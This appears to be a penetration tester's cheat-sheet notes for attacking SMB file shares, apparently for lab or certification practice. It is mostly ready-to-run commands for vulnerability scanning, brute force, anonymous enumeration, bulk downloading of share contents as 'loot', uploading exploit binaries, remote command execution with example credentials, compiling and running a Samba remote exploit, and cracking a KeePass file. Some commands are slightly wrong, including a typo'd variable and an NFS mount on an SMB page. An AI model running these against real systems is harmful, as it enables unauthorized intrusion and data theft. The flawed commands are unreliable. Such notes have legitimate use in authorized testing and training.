### **Checks**

- [ ] Check for null sessions
- [ ] Check the permissions of users you already have
- [ ] Check for passwords in files
- [ ] Attempt brute force on enumerated users
- [ ] Check for EternalBlue
- [ ] Check samba version (if Linux)

### **SMB Versions**

| **SMB Version** | **Supported**                       | **Features**                                                           |
| --------------- | ----------------------------------- | ---------------------------------------------------------------------- |
| CIFS            | Windows NT 4.0                      | Communication via NetBIOS interface                                    |
| SMB 1.0         | Windows 2000                        | Direct connection via TCP                                              |
| SMB 2.0         | Windows Vista, Windows Server 2008  | Performance upgrades, improved message signing, caching feature        |
| SMB 2.1         | Windows 7, Windows Server 2008 R2   | Locking mechanisms                                                     |
| SMB 3.0         | Windows 8, Windows Server 2012      | Multichannel connections, end-to-end encryption, remote storage access |
| SMB 3.0.2       | Windows 8.1, Windows Server 2012 R2 |                                                                        |
| SMB 3.1.1       | Windows 10, Windows Server 2016     | Integrity checking, AES-128 encryption                                 |

### **Exploitable Settings**

|**Setting**|**Description**|
|---|---|
|`browseable = yes`|Allow listing available shares in the current share?|
|`read only = no`|Forbid the creation and modification of files?|
|`writable = yes`|Allow users to create and modify files?|
|`guest ok = yes`|Allow connecting to the service without using a password?|
|`enable privileges = yes`|Honor privileges assigned to specific SID?|
|`create mask = 0777`|What permissions must be assigned to the newly created files?|
|`directory mask = 0777`|What permissions must be assigned to the newly created directories?|
|`logon script = script.sh`|What script needs to be executed on the user's login?|
|`magic script = script.sh`|Which script should be executed when the script gets closed?|
|`magic output = script.out`|Where the output of the magic script needs to be stored?|

#### Quick Wins (require creds)
[[3_Gaining Shell Access (psexec.py)]]
[[3.1_Gaining Shell Access (smbexec.py)]]
[[3.2_Gaining Shell Access (wmiexec.py)]]
#### nmap vuln check:

```bash
nmap --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-cve-2017-7494.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-regsvc-dos.nse,smb-vuln-webexec.nse -p445 $TARGET -Pn
```

#### SMB Mounting

```bash
sudo apt install cifs-utils
```

```bash
mkdir ./$SHARE
```

```bash
sudo mount -t nfs $TARGET:/$SHARE/
```

```bash
mount -t cifs //$TARGET/$SHARE ./$SHARE -o username=<username>,password=<password>,domain=$DOMAIN
```

```bash
grep -R password ./$SHARE
```

#### SMB Enumeration

==CHECK TO SEE IF YOU CAN UPLOAD FILES!==

```bash
git clone https://github.com/cddmp/enum4linux-ng && cd enum4linux-ng
```

```bash
python3 enum4linux-ng.py $TARGET -A -C
```

```bash
nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-services.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse -p445 $TARGET
```

```bash
nmap --script smb-brute.nse -p445 $TARGET
```

```bash
smbmap -H $TARGET -P 445
```

```bash
smbmap -u null -p "" -H $TARGET -P 445
```

List share and gain access with smbclient:

LINUX

```bash
smbclient -L \\\\$TARGET\\ -N -p 445
```

```bash
smbclient -N \\\\$TARGET\\$SHARE
```

WINDOWS

```bash
smbclient -N //$TARGET/$SHARE
```

smbclient anonymous login:

```bash
smbclient -L $TARGET -U " "%" "
```

```bash
smbclient \\\\$TARGET\\scripts$ -U " "%" "
```

#### smbmap.py

```bash
smbmap -H $TARGET
```

```bash
smbmap -H $TARGET -r 'home'
```

```bash
smbmap -H $TARGET -r 'home\useradm'
```

### smbmap Downloading files:

```bash
smbmap -H $TARGET --download 'home\useradm\file.txt'
```

#### smbmap Uploading files:

```bash
smbmap -H $TARGET --upload exploit.exe 'home\useradm\'
```

```bash
smbmap -H $TARGET -P 445 --upload exploit.so 'SusieShare/exploit.so' 
```

```bash
smbmap -u johana -p johana -d spray.csl -x 'net group "Domain Admins" /domain' -H $TARGET
```

#### Using smbclient to list shares (unauthenticated)

```bash
smbclient -L \\\\$TARGET -p 445
```

#### Using smbclient without creds

```bash
smbclient \\\\$TARGET\\spray -p 445
```

#### Using smbclient to list shares (authenticated)

```bash
smbclient -L \\\\$TARGET -U "johana" -p johana
```

#### Using smbclient with creds

```bash
smbclient \\\\$TARGET\\spray -U "johana" -p johana
```

#### Mounting Shares

```bash
mkdir mnt
```

```bash
sudo mount -t cifs //$TARGET/backups ./mnt -o user=,password=
```

```bash
cd mnt
```

```bash
sudo umount ./mount
```

#### using smbclient to download all files:

check out PWK Labs Ralph

```bash
mkdir SMBLoot && cd SMBLoot
```

Unauthenticated:

```bash
smbclient '\\\\$TARGET\\$SHARE'
```

```bash
smbclient -N //$TARGET/$SHARE
```

Authenticated:

```bash
smbclient --user <USER> //$TARGET/<SHARE> <PASSWORD>
```

```bash
mask ""  
```

```bash
recurse ON  
```

```bash
prompt OFF  
```

```bash
mget *
```

```bash
exit
```

```bash
cd ..
```

```bash
find SMBLoot/ -type f
```

To read files locally

```bash
get FileName -
```

==2nd example==  
smbclient //$TARET/Replication  
RECURSE ON  
PROMPT OFF  
mget *

#### Low Level Samba Exploit

```bash
searchsploit -m 10
```

```bash
gcc -o exploit-samba 10.c
```

```bash
./exploit-samba -b 0 $TARGET
```

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

#### Windows share local folder with everyone

Operators Handbook pg 331

```batch
net share cshare C:\<share> /GRANT:Everyone,FULL
```

#### Unsafe nmap script

```bash
sudo nmap --script=smb-enum* --script-args=unsafe=1 $TARGET
```

#### Responder - File upload attack

[https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)

```bash
run/keepass2john CrackThis.kdb > CrackThis.txt
```

